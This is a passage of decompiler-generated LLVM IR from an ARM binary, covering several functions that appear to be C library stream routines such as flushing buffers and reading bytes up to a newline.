bb:                                               ; preds = %dec_label_pc_ec04
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_ec04, %bb
  %v10_ec10 = phi i32 [ %arg1, %dec_label_pc_ec04 ], [ 0, %bb ]
  ret i32 %v10_ec10

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_ec14() local_unnamed_addr {
dec_label_pc_ec14:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_ec14 = load i32, i32* @r4, align 4
  store i32 %v3_ec14, i32* %stack_var_-24, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %r6.global-to-local, align 4
  %v4_ec24 = load i32, i32* inttoptr (i32 142080 to i32*), align 256
  store i32 %v4_ec24, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_ec2c = load i32, i32* inttoptr (i32 142156 to i32*), align 4
  store i32 %v4_ec2c, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_ec38 = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  store i32 %v4_ec38, i32* %r7.global-to-local, align 4
  %v2_ec44 = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_ec38)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_ec58 = load i32, i32* %r6.global-to-local, align 4
  %v2_ec58 = add i32 %v0_ec58, 16
  %v3_ec58 = inttoptr i32 %v2_ec58 to i32*
  %v4_ec58 = load i32, i32* %v3_ec58, align 4
  store i32 %v4_ec58, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_ec58)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_ec68 = load i32, i32* %r6.global-to-local, align 4
  %v2_ec68 = add i32 %v0_ec68, 12
  %v3_ec68 = inttoptr i32 %v2_ec68 to i32*
  %v4_ec68 = load i32, i32* %v3_ec68, align 4
  store i32 %v4_ec68, i32* %r3.global-to-local, align 4
  %v1_ec6c = inttoptr i32 %v4_ec68 to i32*
  %v2_ec6c = load i32, i32* %v1_ec6c, align 4
  store i32 %v2_ec6c, i32* %r3.global-to-local, align 4
  %v7_ec70 = icmp eq i32 %v2_ec6c, 1
  br i1 %v7_ec70, label %dec_label_pc_ec78, label %dec_label_pc_ed38

dec_label_pc_ec78:                                ; preds = %dec_label_pc_ec14
  store i32 52, i32* %r3.global-to-local, align 4
  %v2_ec7c = add i32 %v0_ec68, 52
  %v3_ec7c = inttoptr i32 %v2_ec7c to i32*
  %v4_ec7c = load i32, i32* %v3_ec7c, align 4
  store i32 %v4_ec7c, i32* %r3.global-to-local, align 4
  %v1_ec80 = inttoptr i32 %v4_ec7c to i32*
  %v2_ec80 = load i32, i32* %v1_ec80, align 4
  store i32 %v2_ec80, i32* %r3.global-to-local, align 4
  %tmp30 = icmp slt i32 %v2_ec80, 1
  br i1 %tmp30, label %dec_label_pc_ed38, label %dec_label_pc_ec8c

dec_label_pc_ec8c:                                ; preds = %dec_label_pc_ec78
  store i32 100, i32* %r3.global-to-local, align 4
  %v2_ec90 = add i32 %v0_ec68, 100
  %v3_ec90 = inttoptr i32 %v2_ec90 to i32*
  %v4_ec90 = load i32, i32* %v3_ec90, align 4
  store i32 %v4_ec90, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_ec38)
  call void @__pseudo_branch(i32 %v4_ec58)
  %v0_ecb8 = load i32, i32* %r6.global-to-local, align 4
  %v2_ecb8 = add i32 %v0_ecb8, 48
  %v3_ecb8 = inttoptr i32 %v2_ecb8 to i32*
  %v4_ecb8 = load i32, i32* %v3_ecb8, align 4
  store i32 %v4_ecb8, i32* %r3.global-to-local, align 4
  %v1_ecbc = inttoptr i32 %v4_ecb8 to i32*
  %v2_ecbc = load i32, i32* %v1_ecbc, align 4
  store i32 %v2_ecbc, i32* %r4.global-to-local, align 4
  store i32 48, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_ed0811 = icmp eq i32 %v2_ecbc, 0
  br i1 %v2_ed0811, label %dec_label_pc_ed14, label %dec_label_pc_eccc

dec_label_pc_eccc:                                ; preds = %dec_label_pc_ec8c, %dec_label_pc_ed04
  %v0_ecf02 = phi i32 [ %v0_ed04, %dec_label_pc_ed04 ], [ %v2_ecbc, %dec_label_pc_ec8c ]
  %v1_eccc = inttoptr i32 %v0_ecf02 to i16*
  %v2_eccc = load i16, i16* %v1_eccc, align 2
  %v3_eccc = zext i16 %v2_eccc to i32
  store i32 %v3_eccc, i32* %r3.global-to-local, align 4
  %v2_ecd0 = and i32 %v3_eccc, 32816
  %v7_ecd4 = icmp eq i32 %v2_ecd0, 48
  %v1_ecd8 = add i32 %v0_ecf02, 32
  %v2_ecd8 = inttoptr i32 %v1_ecd8 to i32*
  %v3_ecd8 = load i32, i32* %v2_ecd8, align 4
  store i32 %v3_ecd8, i32* %r5.global-to-local, align 4
  br i1 %v7_ecd4, label %dec_label_pc_ece4, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_eccc
  store i32 %v0_ecf02, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ed04

dec_label_pc_ece4:                                ; preds = %dec_label_pc_eccc
  %v0_ece4 = load i32, i32* %r7.global-to-local, align 4
  %v2_ece4 = icmp eq i32 %v0_ece4, 0
  br i1 %v2_ece4, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_ece4
  %v1_ece8 = load i32, i32* %r6.global-to-local, align 4
  %v2_ece8 = load i32, i32* %r8.global-to-local, align 4
  %v3_ece8 = add i32 %v2_ece8, %v1_ece8
  %v4_ece8 = inttoptr i32 %v3_ece8 to i32*
  %v5_ece8 = load i32, i32* %v4_ece8, align 4
  store i32 %v5_ece8, i32* %r3.global-to-local, align 4
  %v3_ecec = inttoptr i32 %v5_ece8 to i32*
  store i32 %v3_ecd8, i32* %v3_ecec, align 4
  %v0_ecf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_ecf0 = inttoptr i32 %v0_ecf0 to i16*
  %v2_ecf0 = load i16, i16* %v1_ecf0, align 2
  %v3_ecf0 = zext i16 %v2_ecf0 to i32
  store i32 %v3_ecf0, i32* %r3.global-to-local, align 4
  br label %bb31

bb:                                               ; preds = %dec_label_pc_ece4
  %v2_ecf08 = load i16, i16* %v1_eccc, align 2
  %v3_ecf09 = zext i16 %v2_ecf08 to i32
  store i32 %v3_ecf09, i32* %r3.global-to-local, align 4
  %v3_ecf4 = add i32 %v0_ece4, 32
  %v4_ecf4 = inttoptr i32 %v3_ecf4 to i32*
  store i32 %v3_ecd8, i32* %v4_ecf4, align 4
  %v0_ecf8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %.thread, %bb
  %v0_ecf8 = phi i32 [ %v3_ecf0, %.thread ], [ %v0_ecf8.pre, %bb ]
  %v1_ecf8 = and i32 %v0_ecf8, 8192
  %v2_ecf8 = icmp eq i32 %v1_ecf8, 0
  br i1 %v2_ecf8, label %bb33, label %bb32

bb32:                                             ; preds = %bb31
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_ed00 = xor i1 %v2_ecf8, true
  call void @__pseudo_cond_branch(i1 %v1_ed00, i32 ptrtoint (i32* @global_var_108e4.259 to i32))
  %v0_ed04.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_ed04

dec_label_pc_ed04:                                ; preds = %.thread21, %bb33
  %v0_ed04 = phi i32 [ %v0_ed04.pre, %bb33 ], [ %v3_ecd8, %.thread21 ]
  store i32 %v0_ed04, i32* %r4.global-to-local, align 4
  %v2_ed08 = icmp eq i32 %v0_ed04, 0
  br i1 %v2_ed08, label %dec_label_pc_ed08.dec_label_pc_ed14_crit_edge, label %dec_label_pc_eccc

dec_label_pc_ed08.dec_label_pc_ed14_crit_edge:    ; preds = %dec_label_pc_ed04
  %v0_ed20.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ed14

dec_label_pc_ed14:                                ; preds = %dec_label_pc_ed08.dec_label_pc_ed14_crit_edge, %dec_label_pc_ec8c
  %v0_ed20 = phi i32 [ %v0_ed20.pre, %dec_label_pc_ed08.dec_label_pc_ed14_crit_edge ], [ %v0_ecb8, %dec_label_pc_ec8c ]
  store i32 24, i32* %r3.global-to-local, align 4
  %v2_ed20 = add i32 %v0_ed20, 24
  %v3_ed20 = inttoptr i32 %v2_ed20 to i32*
  %v4_ed20 = load i32, i32* %v3_ed20, align 4
  call void @__pseudo_branch(i32 %v4_ed20)
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_ed30 = load i32, i32* %r6.global-to-local, align 4
  %v2_ed30 = add i32 %v0_ed30, 52
  %v3_ed30 = inttoptr i32 %v2_ed30 to i32*
  %v4_ed30 = load i32, i32* %v3_ed30, align 4
  store i32 %v4_ed30, i32* %r3.global-to-local, align 4
  %v0_ed34 = load i32, i32* %r4.global-to-local, align 4
  %v2_ed34 = inttoptr i32 %v4_ed30 to i32*
  store i32 %v0_ed34, i32* %v2_ed34, align 4
  %v0_ed3c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ed38

dec_label_pc_ed38:                                ; preds = %dec_label_pc_ec14, %dec_label_pc_ec78, %dec_label_pc_ed14
  %v0_ed3c = phi i32 [ %v0_ec68, %dec_label_pc_ec14 ], [ %v0_ec68, %dec_label_pc_ec78 ], [ %v0_ed3c.pre, %dec_label_pc_ed14 ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_ed3c = add i32 %v0_ed3c, 12
  %v3_ed3c = inttoptr i32 %v2_ed3c to i32*
  %v4_ed3c = load i32, i32* %v3_ed3c, align 4
  %v1_ed40 = inttoptr i32 %v4_ed3c to i32*
  %v2_ed40 = load i32, i32* %v1_ed40, align 4
  %v1_ed44 = add i32 %v2_ed40, -1
  store i32 %v1_ed44, i32* %v1_ed40, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_ed58 = load i32, i32* %r6.global-to-local, align 4
  %v2_ed58 = add i32 %v0_ed58, 24
  %v3_ed58 = inttoptr i32 %v2_ed58 to i32*
  %v4_ed58 = load i32, i32* %v3_ed58, align 4
  store i32 %v4_ed58, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_ed58)
  %v2_ed68 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_ed68, i32* %r4.global-to-local, align 4
  ret i32 %v2_ec44

; uselistorder directives
  uselistorder i32 %v0_ed04, { 2, 1, 0 }
  uselistorder i32 %v4_ec38, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 1, 7, 2, 0, 3, 4, 5, 6, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 0, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder label %dec_label_pc_ed38, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ed04, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_eccc, { 1, 0 }
}

define i32 @function_ed74(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ed74:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-72 = alloca i32, align 4
  %v0_ed74 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ed74, label %bb, label %dec_label_pc_ed74..thread8_crit_edge

dec_label_pc_ed74..thread8_crit_edge:             ; preds = %dec_label_pc_ed74
  %v0_edb0.pre = load i32, i32* @r0, align 4
  br label %.thread8

bb:                                               ; preds = %dec_label_pc_ed74
  store i32 0, i32* @r0, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_ed74..thread8_crit_edge, %bb
  %v0_edcc.pr = phi i32 [ %v0_edb0.pre, %dec_label_pc_ed74..thread8_crit_edge ], [ 0, %bb ]
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %sb.global-to-local, align 4
  %v4_edac = load i32, i32* inttoptr (i32 142092 to i32*), align 4
  store i32 %v4_edac, i32* %r3.global-to-local, align 4
  %v9_edb0 = icmp eq i32 %v0_edcc.pr, %v4_edac
  store i32 %v0_edcc.pr, i32* %fp.global-to-local, align 4
  br i1 %v9_edb0, label %bb49, label %dec_label_pc_edc8

bb49:                                             ; preds = %.thread8
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_edd8

dec_label_pc_edc8:                                ; preds = %.thread8
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_edcc = icmp eq i32 %v0_edcc.pr, 0
  br i1 %v2_edcc, label %dec_label_pc_edd8, label %dec_label_pc_ef40

dec_label_pc_edd8:                                ; preds = %bb49, %dec_label_pc_edc8
  %stack_var_-60.1.in = phi i32 [ 0, %bb49 ], [ 256, %dec_label_pc_edc8 ]
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_edec = load i32, i32* inttoptr (i32 142156 to i32*), align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_edf8 = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  store i32 16, i32* %stack_var_-72, align 4
  store i32 %v4_edec, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_edf8)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_ee1c = load i32, i32* %sb.global-to-local, align 4
  %v2_ee1c = add i32 %v0_ee1c, 16
  %v3_ee1c = inttoptr i32 %v2_ee1c to i32*
  %v4_ee1c = load i32, i32* %v3_ee1c, align 4
  call void @__pseudo_branch(i32 %v4_ee1c)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_ee2c = add i32 %v0_ee1c, 12
  %v3_ee2c = inttoptr i32 %v2_ee2c to i32*
  %v4_ee2c = load i32, i32* %v3_ee2c, align 4
  store i32 %v4_ee2c, i32* %r2.global-to-local, align 4
  %v1_ee30 = inttoptr i32 %v4_ee2c to i32*
  %v2_ee30 = load i32, i32* %v1_ee30, align 4
  store i32 24, i32* %sl.global-to-local, align 4
  %v1_ee38 = add i32 %v2_ee30, 1
  store i32 %v1_ee38, i32* %r3.global-to-local, align 4
  %v2_ee3c = add i32 %v0_ee1c, 24
  %v3_ee3c = inttoptr i32 %v2_ee3c to i32*
  %v4_ee3c = load i32, i32* %v3_ee3c, align 4
  store i32 %v1_ee38, i32* %v1_ee30, align 4
  call void @__pseudo_branch(i32 %v4_ee3c)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_ee58 = load i32, i32* %sb.global-to-local, align 4
  %v2_ee58 = add i32 %v0_ee58, 100
  %v3_ee58 = inttoptr i32 %v2_ee58 to i32*
  %v4_ee58 = load i32, i32* %v3_ee58, align 4
  store i32 %v4_ee58, i32* @r4, align 4
  store i32 %v4_ee58, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_edf8)
  call void @__pseudo_branch(i32 %v4_ee1c)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_ee80 = load i32, i32* %sb.global-to-local, align 4
  %v2_ee80 = add i32 %v0_ee80, 48
  %v3_ee80 = inttoptr i32 %v2_ee80 to i32*
  %v4_ee80 = load i32, i32* %v3_ee80, align 4
  store i32 %v4_ee80, i32* %r3.global-to-local, align 4
  %v1_ee8c = inttoptr i32 %v4_ee80 to i32*
  %v2_ee8c = load i32, i32* %v1_ee8c, align 4
  store i32 %v2_ee8c, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_ee3c)
  %v0_ee98 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_ee98, i32* @r6, align 4
  %v2_ee9c = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_ee9c, i32* @r8, align 4
  store i32 76, i32* %fp.global-to-local, align 4
  %v0_ef30.pr = load i32, i32* @r7, align 4
  %v2_ef3028 = icmp eq i32 %v0_ef30.pr, 0
  br i1 %v2_ef3028, label %dec_label_pc_ef38, label %dec_label_pc_eea4

dec_label_pc_eea4:                                ; preds = %dec_label_pc_edd8, %dec_label_pc_ef2c
  %v0_eeb0 = phi i32 [ %v3_ef2c, %dec_label_pc_ef2c ], [ %v0_ef30.pr, %dec_label_pc_edd8 ]
  %v1_eea4 = inttoptr i32 %v0_eeb0 to i16*
  %v2_eea4 = load i16, i16* %v1_eea4, align 2
  %v3_eea4 = zext i16 %v2_eea4 to i32
  store i32 %v3_eea4, i32* %r3.global-to-local, align 4
  %v1_eea8 = and i32 %v3_eea4, 64
  %v2_eea8 = icmp eq i32 %v1_eea8, 0
  br i1 %v2_eea8, label %dec_label_pc_ef2c, label %dec_label_pc_eeb0

dec_label_pc_eeb0:                                ; preds = %dec_label_pc_eea4
  %v1_eeb0 = add i32 %v0_eeb0, 56
  store i32 %v1_eeb0, i32* @r4, align 4
  store i32 %v1_eeb0, i32* %r2.global-to-local, align 4
  %v0_eec0 = load i32, i32* %sb.global-to-local, align 4
  %v1_eec0 = load i32, i32* %fp.global-to-local, align 4
  %v2_eec0 = add i32 %v1_eec0, %v0_eec0
  %v3_eec0 = inttoptr i32 %v2_eec0 to i32*
  %v4_eec0 = load i32, i32* %v3_eec0, align 4
  call void @__pseudo_branch(i32 %v4_eec0)
  %v1_eed0 = load i32, i32* @r8, align 4
  %v2_eed0 = add i32 %v1_eed0, %v0_eec0
  %v3_eed0 = inttoptr i32 %v2_eed0 to i32*
  %v4_eed0 = load i32, i32* %v3_eed0, align 4
  call void @__pseudo_branch(i32 %v4_eed0)
  %v0_eedc = load i32, i32* @r7, align 4
  %v1_eedc = inttoptr i32 %v0_eedc to i16*
  %v2_eedc = load i16, i16* %v1_eedc, align 2
  %v3_eedc = zext i16 %v2_eedc to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_eee4 = or i32 %v3_eedc, %stack_var_-60.1.in
  %v1_eee8 = xor i32 %v2_eee4, 320
  store i32 %v1_eee8, i32* %r3.global-to-local, align 4
  %v1_eeec = and i32 %v1_eee8, 832
  %v2_eeec = icmp eq i32 %v1_eeec, 0
  br i1 %v2_eeec, label %dec_label_pc_eef4, label %bb50

dec_label_pc_eef4:                                ; preds = %dec_label_pc_eeb0
  store i32 %v0_eedc, i32* @r0, align 4
  %v0_eef8 = call i32 @function_d978()
  %v2_eefc = icmp eq i32 %v0_eef8, 0
  br i1 %v2_eefc, label %.thread16, label %.thread17

.thread16:                                        ; preds = %dec_label_pc_eef4
  %v1_ef00 = load i32, i32* @r7, align 4
  %v2_ef00 = inttoptr i32 %v1_ef00 to i16*
  %v3_ef00 = load i16, i16* %v2_ef00, align 2
  %v4_ef00 = zext i16 %v3_ef00 to i32
  store i32 %v4_ef00, i32* %r3.global-to-local, align 4
  %v2_ef04 = add i32 %v1_ef00, 8
  %v3_ef04 = inttoptr i32 %v2_ef04 to i32*
  %v4_ef04 = load i32, i32* %v3_ef04, align 4
  store i32 %v4_ef04, i32* %r2.global-to-local, align 4
  %v2_ef08 = and i32 %v4_ef00, 65471
  store i32 %v2_ef08, i32* %r3.global-to-local, align 4
  %v3_ef0c = add i32 %v1_ef00, 28
  %v4_ef0c = inttoptr i32 %v3_ef0c to i32*
  store i32 %v4_ef04, i32* %v4_ef0c, align 4
  %v1_ef10 = load i32, i32* %r3.global-to-local, align 4
  %v2_ef10 = trunc i32 %v1_ef10 to i16
  %v3_ef10 = load i32, i32* @r7, align 4
  %v4_ef10 = inttoptr i32 %v3_ef10 to i16*
  store i16 %v2_ef10, i16* %v4_ef10, align 2
  br label %bb50

.thread17:                                        ; preds = %dec_label_pc_eef4
  store i32 -1, i32* @r6, align 4
  br label %bb50

bb50:                                             ; preds = %.thread16, %dec_label_pc_eeb0, %.thread17
  %v0_ef20 = load i32, i32* %sb.global-to-local, align 4
  %v1_ef20 = load i32, i32* %sl.global-to-local, align 4
  %v2_ef20 = add i32 %v1_ef20, %v0_ef20
  %v3_ef20 = inttoptr i32 %v2_ef20 to i32*
  %v4_ef20 = load i32, i32* %v3_ef20, align 4
  call void @__pseudo_branch(i32 %v4_ef20)
  %v0_ef2c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_ef2c

dec_label_pc_ef2c:                                ; preds = %dec_label_pc_eea4, %bb50
  %v0_ef2c = phi i32 [ %v0_eeb0, %dec_label_pc_eea4 ], [ %v0_ef2c.pre, %bb50 ]
  %v1_ef2c = add i32 %v0_ef2c, 32
  %v2_ef2c = inttoptr i32 %v1_ef2c to i32*
  %v3_ef2c = load i32, i32* %v2_ef2c, align 4
  store i32 %v3_ef2c, i32* @r7, align 4
  %v2_ef30 = icmp eq i32 %v3_ef2c, 0
  br i1 %v2_ef30, label %dec_label_pc_ef38, label %dec_label_pc_eea4

dec_label_pc_ef38:                                ; preds = %dec_label_pc_ef2c, %dec_label_pc_edd8
  %v0_ef38 = call i32 @function_ec14()
  %v0_ef74.pre = load i32, i32* @r6, align 4
  br label %bb52

dec_label_pc_ef40:                                ; preds = %dec_label_pc_edc8
  %v1_ef40 = inttoptr i32 %v0_edcc.pr to i16*
  %v2_ef40 = load i16, i16* %v1_ef40, align 2
  %v3_ef40 = zext i16 %v2_ef40 to i32
  %v1_ef44 = and i32 %v3_ef40, 64
  store i32 %v1_ef44, i32* %r3.global-to-local, align 4
  %v2_ef44 = icmp eq i32 %v1_ef44, 0
  br i1 %v2_ef44, label %bb51, label %dec_label_pc_ef50

bb51:                                             ; preds = %dec_label_pc_ef40
  br label %bb52

dec_label_pc_ef50:                                ; preds = %dec_label_pc_ef40
  %v0_ef50 = call i32 @function_d978()
  %v2_ef54 = icmp eq i32 %v0_ef50, 0
  br i1 %v2_ef54, label %.thread24, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_ef50
  br label %bb52

.thread24:                                        ; preds = %dec_label_pc_ef50
  %v1_ef58 = load i32, i32* %fp.global-to-local, align 4
  %v2_ef58 = inttoptr i32 %v1_ef58 to i16*
  %v3_ef58 = load i16, i16* %v2_ef58, align 2
  %v4_ef58 = zext i16 %v3_ef58 to i32
  store i32 %v4_ef58, i32* %r3.global-to-local, align 4
  %v2_ef5c = add i32 %v1_ef58, 8
  %v3_ef5c = inttoptr i32 %v2_ef5c to i32*
  %v4_ef5c = load i32, i32* %v3_ef5c, align 4
  store i32 %v4_ef5c, i32* %r2.global-to-local, align 4
  %v2_ef60 = and i32 %v4_ef58, 65471
  store i32 %v2_ef60, i32* %r3.global-to-local, align 4
  %v2_ef64 = trunc i32 %v2_ef60 to i16
  store i16 %v2_ef64, i16* %v2_ef58, align 2
  %v1_ef68 = load i32, i32* %r2.global-to-local, align 4
  %v2_ef68 = load i32, i32* %fp.global-to-local, align 4
  %v3_ef68 = add i32 %v2_ef68, 28
  %v4_ef68 = inttoptr i32 %v3_ef68 to i32*
  store i32 %v1_ef68, i32* %v4_ef68, align 4
  br label %bb52

bb52:                                             ; preds = %bb51, %.thread26, %dec_label_pc_ef38, %.thread24
  %v0_ef74 = phi i32 [ -1, %.thread26 ], [ 0, %bb51 ], [ %v0_ef74.pre, %dec_label_pc_ef38 ], [ 0, %.thread24 ]
  ret i32 %v0_ef74

; uselistorder directives
  uselistorder i32 %v3_ef2c, { 1, 2, 0 }
  uselistorder i32 %v0_ee1c, { 1, 0, 2 }
  uselistorder i32 %v0_edcc.pr, { 1, 0, 2, 3 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32 ()* @function_ec14, { 1, 0 }
  uselistorder label %bb52, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_ef2c, { 1, 0 }
  uselistorder label %bb50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_eea4, { 1, 0 }
  uselistorder label %dec_label_pc_edd8, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @function_ef88(i32 %arg1) local_unnamed_addr {
dec_label_pc_ef88:
  %v0_ef88 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ef88, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_ef88
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_ef88, %bb
  %v5_efa4 = phi i32 [ %arg1, %dec_label_pc_ef88 ], [ 0, %bb ]
  ret i32 %v5_efa4

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @function_efa8(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_efa8:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_efa8 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_efac = icmp eq i32 %arg2, 0
  store i1 %v2_efac, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_f034, label %dec_label_pc_f01c.preheader

dec_label_pc_f01c.preheader:                      ; preds = %dec_label_pc_efa8
  store i32 %tmp, i32* @r5, align 4
  %v1_f01c2 = add i32 %arg2, -1
  store i32 %v1_f01c2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_f01c8 = icmp eq i32 %arg2, 1
  store i1 %v7_f01c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f01c8, label %dec_label_pc_f024, label %dec_label_pc_efc8

dec_label_pc_efc8:                                ; preds = %dec_label_pc_f01c.preheader, %dec_label_pc_f01c.backedge.dec_label_pc_efc8_crit_edge
  %v0_efec = phi i32 [ %v0_efc8.pre, %dec_label_pc_f01c.backedge.dec_label_pc_efc8_crit_edge ], [ %arg3, %dec_label_pc_f01c.preheader ]
  %v1_efc8 = add i32 %v0_efec, 16
  %v2_efc8 = inttoptr i32 %v1_efc8 to i32*
  %v3_efc8 = load i32, i32* %v2_efc8, align 4
  store i32 %v3_efc8, i32* %r2.global-to-local, align 4
  %v1_efcc = add i32 %v0_efec, 24
  %v2_efcc = inttoptr i32 %v1_efcc to i32*
  %v3_efcc = load i32, i32* %v2_efcc, align 4
  store i32 %v3_efcc, i32* %r3.global-to-local, align 4
  %v3_efd0 = icmp uge i32 %v3_efc8, %v3_efcc
  store i1 %v3_efd0, i1* %cpsr_c.global-to-local, align 1
  %v9_efd0 = icmp eq i32 %v3_efc8, %v3_efcc
  store i1 %v9_efd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_efd0, label %dec_label_pc_efec, label %dec_label_pc_efd8

dec_label_pc_efd8:                                ; preds = %dec_label_pc_efc8
  %v1_efd8 = inttoptr i32 %v3_efc8 to i8*
  %v2_efd8 = load i8, i8* %v1_efd8, align 1
  %v3_efd8 = zext i8 %v2_efd8 to i32
  store i32 %v3_efd8, i32* %r3.global-to-local, align 4
  %v5_efd8 = add i32 %v3_efc8, 1
  store i32 %v5_efd8, i32* %r2.global-to-local, align 4
  %v2_efdc = load i32, i32* @r5, align 4
  %v3_efdc = inttoptr i32 %v2_efdc to i8*
  store i8 %v2_efd8, i8* %v3_efdc, align 1
  %v4_efdc = load i32, i32* @r5, align 4
  %v5_efdc = add i32 %v4_efdc, 1
  store i32 %v5_efdc, i32* @r5, align 4
  %v0_efe0 = load i32, i32* %r3.global-to-local, align 4
  %v2_efe0 = icmp ugt i32 %v0_efe0, 9
  store i1 %v2_efe0, i1* %cpsr_c.global-to-local, align 1
  %v7_efe0 = icmp eq i32 %v0_efe0, 10
  store i1 %v7_efe0, i1* %cpsr_z.global-to-local, align 1
  %v0_efe4 = load i32, i32* %r2.global-to-local, align 4
  %v1_efe4 = load i32, i32* @r4, align 4
  %v2_efe4 = add i32 %v1_efe4, 16
  %v3_efe4 = inttoptr i32 %v2_efe4 to i32*
  store i32 %v0_efe4, i32* %v3_efe4, align 4
  br i1 %v7_efe0, label %dec_label_pc_f024, label %dec_label_pc_f01c.backedge

dec_label_pc_efec:                                ; preds = %dec_label_pc_efc8
  %v1_efec = inttoptr i32 %v0_efec to i16*
  %v3_eff0 = call i32 @function_13e54(i16* %v1_efec)
  %v3_eff4 = icmp eq i32 %v3_eff0, -1
  store i1 %v3_eff4, i1* %cpsr_c.global-to-local, align 1
  %v8_eff4 = icmp eq i32 %v3_eff0, -1
  store i1 %v8_eff4, i1* %cpsr_z.global-to-local, align 1
  %v1_eff8 = urem i32 %v3_eff0, 256
  store i32 %v1_eff8, i32* %r3.global-to-local, align 4
  br i1 %v3_eff4, label %dec_label_pc_f000, label %dec_label_pc_f018

dec_label_pc_f000:                                ; preds = %dec_label_pc_efec
  %v0_f000 = load i32, i32* @r4, align 4
  %v1_f000 = inttoptr i32 %v0_f000 to i16*
  %v2_f000 = load i16, i16* %v1_f000, align 2
